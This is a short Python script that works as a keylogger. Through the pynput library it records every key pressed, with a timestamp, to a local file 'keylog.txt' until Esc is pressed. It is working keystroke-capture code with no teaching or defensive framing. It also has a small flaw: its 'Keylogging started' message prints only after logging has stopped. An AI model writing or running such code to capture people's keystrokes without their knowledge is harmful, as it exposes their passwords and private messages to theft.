from pynput import keyboard
from datetime import datetime

def on_press(key):
    try:
        current_key = key.char
    except AttributeError:
        current_key = str(key)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open("keylog.txt", "a") as f:
        f.write(f"[{timestamp}] {current_key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

print("Keylogging started. Press Esc to stop and check 'keylog.txt'.")